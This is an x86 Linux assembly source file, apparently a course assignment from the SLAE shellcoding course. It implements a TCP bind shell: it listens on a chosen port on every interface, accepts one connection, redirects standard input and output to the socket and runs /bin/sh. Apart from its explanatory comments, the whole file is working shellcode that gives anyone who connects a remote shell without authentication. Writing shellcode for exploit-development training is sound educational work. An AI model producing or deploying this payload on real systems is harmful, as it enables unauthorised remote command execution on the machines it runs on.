; bind.nasm - A TCP Bind Shell
; Assignment 1 of SLAE course
; 2018-06-21 Thomas Karpiniec

; Compile with chosen port in network byte order, e.g. 4444:
;     nasm -f elf32 -o bind.o -DLISTEN_PORT=0x5c11 bind.nasm

global _start

       AF_INET		equ 2
       SOCK_STREAM 	equ 1
       SYS_SOCKET 	equ 359
       SYS_BIND 	equ 361
       SYS_LISTEN	equ 363
       SYS_ACCEPT4 	equ 364
       SYS_DUP2 	equ 63
       SYS_EXECVE 	equ 11


_start:
	; Obtain an AF_INET socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov ax, SYS_SOCKET	; syscall
	mov bl, AF_INET		; domain
	mov cl, SOCK_STREAM	; type
	xor edx, edx		; protocol = 0
	int 0x80
	mov edi, eax		; Save socket fd in EDI

	; Push struct sockaddr_in backwards onto stack - all interfaces port 4444
	push edx		; 4 bytes zero padding
	push edx	    	; 4 bytes zero padding
	push edx	    	; sin_addr = 0x00000000 = INADDR_ANY
	push word LISTEN_PORT	; sin_port
	push word AF_INET	; sin_family
	
	; Bind interface and port
	mov ax, SYS_BIND	; syscall
	mov ebx, edi		; sockfd = created socket fd
	mov ecx, esp		; esp points to start of sockaddr
	mov dl, 16   		; addrlen = sizeof(struct sockaddr) = 16
	int 0x80

	; Listen for connections
	mov ax, SYS_LISTEN	; syscall
	mov ebx, edi		; sockfd = created socket fd
	xor ecx, ecx		; backlog = 0
	int 0x80 		; should place 0 in eax

	; Accept the first connection that arrives
	; This won't work more than once
	mov ax, SYS_ACCEPT4    ; syscall
	mov ebx, edi	       ; sockfd = created socket fd
	xor ecx, ecx	       ; addr
	xor edx, edx	       ; addrlen
	xor esi, esi	       ; flags
	int 0x80
	mov edi, eax	       ; retval is fd for the client connection

	; Redirect STDIN, STDOUT and STDERR to the client socket
	; assume new client fd was <256 so we can just overwrite al
	mov al, SYS_DUP2        ; syscall
	mov ebx, edi		; socket
	xor ecx, ecx		; STDIN
	int 0x80

	mov al, SYS_DUP2	; syscall
	mov cl, 1		; STDOUT
	int 0x80

	mov al, SYS_DUP2	; syscall
	mov cl, 2		; STDERR
	int 0x80

	; Execute /bin/sh, inheriting file descriptors from this process
	; /bin//sh = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
	push edx		; null termination
	push dword 0x68732f2f	; last half of string
	push dword 0x6e69622f	; first half of string = filename
	push edx		; null terminator of array = envp array
	lea ebx, [esp + 4]	; Point to beginning of /bin//sh in ebx
	push ebx      		; After this, esp = start of argv array

	mov al, SYS_EXECVE	; syscall
	; ebx = filename is already set
	mov ecx, esp	    	; argv
	lea edx, [ecx + 4]	; envp = &argv[1]
	int 0x80
	
	
	
	